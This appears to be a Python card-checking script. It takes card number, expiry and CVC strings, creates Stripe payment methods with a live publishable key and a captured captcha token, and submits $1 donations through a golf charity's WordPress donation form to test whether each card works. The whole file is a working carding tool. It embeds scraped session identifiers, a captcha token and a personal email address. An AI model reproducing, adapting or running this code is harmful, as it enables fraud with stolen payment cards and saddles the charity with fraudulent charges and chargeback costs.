import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=00b7189c-c57c-4441-a2c5-1a407c665d16e5b713&muid=fb6d3971-8f72-43dd-97e4-6e86f0cc7528781364&sid=a7efdaa5-3806-47e9-9eee-573b741e34224452a1&payment_user_agent=stripe.js%2Fafaafa4bc4%3B+stripe-js-v3%2Fafaafa4bc4%3B+card-element&referrer=https%3A%2F%2Fgolf316.org&time_on_page=184457&key=pk_live_51NJgOXCjU8lO8MWc81K66yGhcm9C0UPHTGgfypyAMPmRU79JIeCDD5mPWBGOU2v8hcYshCsaVmnqNzl50NQEe4p100CxLWdRv1&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoieWFVa3ord2M4cnd0dndBNG1EdzZ4VDRDcDRuMnZqRVJZbUFpWnpqc0huZTAwckM5U2ppaUJyaC9vQVNZOVUrMlM4T1FNWjVYZjZ2azJRNExZeG0rcXhMVkU5WkloTkF3NThZQkpxYUpKSFU3U2hXT3FxY0FpbE4xQTVGMThtODN2Q1hSdFI0QzMyRDdaYzNUR1FqczZOTWFMUlpXSGpRMEwrbUZseStQaDNJdFhjNStla1NQelZwTUtqWnJZaFRkQUI2L0ZJMW1HZnk3TU1Oa3ZkakxMMmdDMm1oaStHRU1IN2wxbkl0UGVLYkhSOHdEVW9Dc2ZuU0RwT2NWNEs5UjdVcjU4YW1MVHJ4ak96NmFVK2lOZHBraXZrdXpFbFZOOFB1U1lBRCtCMUhHOVV2aXBpL3VNaVZYeXJZK3JjMzBPSlh3RFM0ZzF3S3lxTFZwelpISU1TZWM4dkszU2QzNGdGNnJmTnNrQk9uTUhUNmJrUVJnNGpreDFBMnZaa2IrcG5Uclp2dXZzMkJ2T1Zqb0VLQk9jRFZOZzd3b3ZMOFdmU0Jlc2pGQ0VxaUVUcjdSeitiSkZRYkZMdjdYTEtBQjdqMyt5Q2J4SzZodEtVV25YOThDRHNXZ2V0THdOakdtajlOZU92K3JROGRBMkNMQ2RLZWhlNEtXQlZ6dnNLQnVCVFJLdVFENWJPM0pzeElGbDZQMUp1clFtTU42T01QbW5hZDJ2SWVmbzRrTDhWQldRa1Vwb3JJZ3o0RHZYZi9qU1Y3MXBCcUpNTUUyWUZrR0pYTWk5Nm45amlvYklaQjYwQmtLQmt1L1lHdmc4RXFuYjFCbmlYQnlsMWpJSW8wTFVxNFVGVnlzcml5cktGeFBoNFM4TnoreS85cFJrRXY0RVFiL0gzTFNFNVE1OEs0QTdWT3F0aytqeWpiaVFqaTJwZElzS3g2V3FKeU5URHMrSWRJbzBJK2RmR0JYbnRCaDdZVmZwdWJ1ZlFRb2QwUVZaOFkzQTNrRmhXTS84T2NwY0Y0Ym1ackZIUDRQdlVrcVk2UXQrRDRibnk4bXU1aDRqZzhHbGJ5cW9qZXFuYUlKZU45VHVyV3B6OEtFSkN0K2d5RDBjajRZTG14ei9NSTJodjhhcDFpRVlmbFlxQnlwRWVOaVdyTjZ5UWczY2wwYlpzbjhNVzNkeHBlbnZqVndXMC90bWZnVlA4VEkxc1lYQkZGRTRzMldUNlZMekNQMnlyRm1FdEZ4SjJDQ2YxN1lqMXBETlJOZlJsV0JmdzVXaGM0N201dWR0Zm01MEZEcldpcStFUHRiZnZyL3ozUjZCOVI3TVFBTy9JcklkTmUySVgyRll4eHlBMUtSZEhEMzZtK1VsZmNWMFB0WW8yYWtnK1JJQ1oyRmtxQVAzajRzanBWRzVsTk00YUoxTHYvdno5S1Rac0Z6T05HVVZIV1h0RTE5WEIybkNlVDJxMXQ5VUlkT0ZOSGdXK1pXZ3BzYXlpVzdvUEx1OEg3ZVdkTUQxUmRSdHltYlIvNlNIZk1MM1VGbGVWWWNCeUVKM283bTFjN3pmYnQyOE52KzQwRkRkbUJqendqQnRWK1hjd1N6RnhYMDdTUnVjR0llclh3VTR3MllKVnlWaGZEK083c0hmWmlkQUI5aUZZY1JzNVlTWE1oN3RJZHR0emVrQlRYblVVd1ByUThORmw1THlaS0RILzB3UXZmVkdmSjRoYmo0b2crSjRHNGh1azBRS0dQcmRwUUNXbFhRU2NzaGRxN1hvYVJNTmI1UWJsVStLVVBaTnJoMXcrK21zSjVRRW5xVEV0cUt2c1loZzY3aUVuaVcza1ZBTXRTSFFNWXJnU0lOSVY2eTFUbElvWG9pUTQ0bDR3UGgzK2ZkdmdNak9oc2RBNXUwcFk0a0FWRS9FYStTeVc0RVp1cm1yQUpYb2NoclNLdHVJdnl4dytpVHpEVEVLS0NLNVR0OFpxcVpzakREbnVFQlZaVUNKV09DRnhHazNIT2orcUZ5alcrMDAxb3hVV0Zadk1XTEdpY29PVStoUDVmMG9pSGdnR2J0V25VbysyNGpuV0VIc2N1R1hOSmJDQWVwbG1ObWxFOTVuWEhLaXdFc1JyMXdnUWYwbTR1RUlWNUxnU3NIWGE0T1VWUjlGYXpNN2p4Wkh2M0NMVWlVS0ZHSFdnLzU5b1hML3UxdmJUa29nM0lMV0d4aE9LekxaSTQzVUI5SnMrNi9VdExsQ2UvclBLYlZySlBFWUNPWWFzOEs5bFhGcW91TkFkdmt2b3BYQklVWFhNQXQzTk1ic3RtVDIzU3E3R3Q4anlaQlNKMGUvRmRXK29kekJPcDdPTm9ycjRHNjNGVm9WVUxjcEhJY3Q3Y29udTlqTU1DQ1VnRXk5NGZQUm9XMndIeFplTlJMcFJ6U0lZcHpYVHN0VUdpMnBBcEVBTUU0OGxYd3hUQ0dPOERSUDVlVW5QSk5JREwzT1R6Q2tsMDAvSVBRWFVTbGNwYmJmZnd1aTZkQTFpRURKR2JlOVlwcjc3QTdLdHo4UUZ5ZjA4a0tEdzBndzcrdU95OGxPNTFtTmMwUWxpb0NPWU92czdORjljdHBhUVdvZHNid2RweGhoM01BMjZxZVJFVDJwc1J1NVNzMmhFbEw5Q2ZpVkpFZlpkMHdKZkt3SVZaRnpEcG9ZOU14bllmRkdPckc5eHUzakVINUYwYzRxbHg3YkJ4alRkbHpnRW5uRzdKZGpFeGcwZGdWbUttZWt5T09KZzduTThjaTdXQUVhWTk5SlNKaXNxVVVQRXRUMmRCQ3dRPT0iLCJleHAiOjE3MjYzMDgwMDIsInNoYXJkX2lkIjoyNTkxODkzNTksImtyIjoiZjM3YTQ5YiIsInBkIjowLCJjZGF0YSI6IlhhNWR6UjQ0TkhVU2VtbjZoWjBiK2ZkOFFqWld4TDF5cU1iM1BiR1oveXlINHZLM3lhQ3dHSFdBcFZsT0t6RDVOZ0dnUXZHQUQxRFZrSXkwWTZpRWhIQU1jUUxnOTc0eFJCbXduNnRiOVc2eUEvc2tXT0xjd1VEcStpMEowTWdQc1F2TWxzYUlUbXdPRDhnYkZoRkdGWm0rR2J5VVBNMTdROVhGWU5TNlVWVE9NcW9wTC9ZREJMYXQzcGRYTFRyN1h1cVRxbTBFYWdDaGRnM0cifQ.TyNcQHzHslxF6u4hB_7IWoniy42bZuRg8v7gCkD796A'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
	    '__stripe_mid': 'fb6d3971-8f72-43dd-97e4-6e86f0cc7528781364',
	    '__stripe_sid': 'a7efdaa5-3806-47e9-9eee-573b741e34224452a1',
	}
	
	headers = {
	    'authority': 'golf316.org',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=29b7e385-6f01-4cf6-b48f-ef916da42142d8ed93; __stripe_sid=a20796ea-226d-4e43-9893-02d9b5e38119a42bed',
	    'origin': 'https://golf316.org',
	    'pragma': 'no-cache',
	    'referer': 'https://golf316.org/donations/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1726307959847',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=2161&_fluentform_7_fluentformnonce=5da14f0981&_wp_http_referer=%2Fdonations%2F&names%5Bfirst_name%5D=HEPT0S&names%5Blast_name%5D=MASSES&email=andrealsteenbu%40gmail.com&payment_input=Other&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '7',
	}
	
	r2 = requests.post('https://golf316.org/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	return (r2.json())
  
